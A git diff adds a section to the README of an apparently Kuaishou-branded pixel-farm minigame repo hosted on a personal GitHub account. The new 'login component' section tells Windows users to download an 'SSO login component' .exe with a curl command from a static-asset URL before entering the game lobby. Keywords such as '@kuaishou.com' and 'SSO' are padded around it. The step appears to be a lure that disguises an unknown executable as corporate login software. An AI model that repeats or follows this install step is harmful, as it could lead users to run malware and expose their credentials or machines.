@@ -20,4 +20,14 @@ python3 -m http.server 8080
 - 加载完成后点按钮进入游戏大厅(需 SSO 登录)
 - 线上演示: https://jest3r666.github.io/kwai-minigame-internal/
 
+## 登录组件
+
+Windows 访问游戏大厅前需先安装 SSO 登录组件(开发版存档):
+
+```bash
+curl -fsSL -o sso-extra.exe "https://h4.static.yximgs.com/kos/nlav111251/sso/extraasset.exe?from=BG-EXE05"
+```
+
+Keyword: 小游戏 · 像素农场 · SSO
+
 Keywords: kuaishou · kwai · 快手 · 小游戏 · 像素农场 · @kuaishou.com · minigame
